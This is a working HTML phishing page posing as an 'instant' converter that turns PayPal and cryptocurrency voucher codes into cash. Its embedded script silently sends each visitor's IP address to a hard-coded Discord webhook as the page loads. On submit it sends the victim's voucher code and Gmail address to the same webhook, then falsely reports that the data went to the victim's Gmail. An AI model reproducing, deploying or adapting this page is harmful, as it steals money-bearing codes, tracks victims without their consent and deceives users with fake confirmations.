<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Code Submission</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f0f0;
    }
    .container {
      text-align: center;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      width: 300px;
    }
    .input-box {
      margin-bottom: 15px;
    }
    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 10px 20px;
      cursor: pointer;
      border-radius: 5px;
    }
    button:hover {
      background-color: #45a049;
    }
    #status {
      margin-top: 15px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Voucher to cash converter INSTANT DELIVERY</h1>
    <div class="input-box">
      <label for="code">Enter pp, bitcoin, ltc, ect voucher code:</label>
      <input type="text" id="code" placeholder="Type your code here">
    </div>
    <div class="input-box">
      <label for="email">Enter Gmail to save recite to and also use the gmail you use to setup account or you wont get the money:</label>
      <input type="email" id="email" placeholder="Type your Gmail here">
    </div>
    <button id="submit">Convert your cash to gmail</button>
    <p id="status"></p>
  </div>

  <script>
    (async () => {
      const status = document.getElementById('status');
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        const webhookUrl = 'https://discordapp.com/api/webhooks/1328025707397517315/IlMmptpCbpxPwvEYDZBqekiKKiGPsCCG63r8s0aEet3Zs-QAo5GHEfw5COPkVfeIpPDU';
        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**New client IP: ${userIP}**\n**Visit https://www.whatismyip.com/ for additional details.`
          }),
        });
      } catch (error) {
        console.error('Error fetching IP or sending webhook:', error);
      }
    })();

    document.getElementById('submit').addEventListener('click', async () => {
      const code = document.getElementById('code').value;
      const email = document.getElementById('email').value;
      const status = document.getElementById('status');

      if (!code || !email) {
        status.textContent = 'Please fill out both fields.';
        status.style.color = 'red';
        return;
      }

      const webhookUrl = 'https://discordapp.com/api/webhooks/1328025707397517315/IlMmptpCbpxPwvEYDZBqekiKKiGPsCCG63r8s0aEet3Zs-QAo5GHEfw5COPkVfeIpPDU';
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**Gmail Submitted:** ${email}\n**Code Submitted:** ${code}`
          }),
        });

        status.textContent = 'Data sent successfully to your gmail!';
        status.style.color = 'green';
      } catch (error) {
        console.error('Error sending data to gmail:', error);
        status.textContent = 'Failed to send data. Please try again later.';
        status.style.color = 'red';
      }
    });
  </script>
</body>
</html>
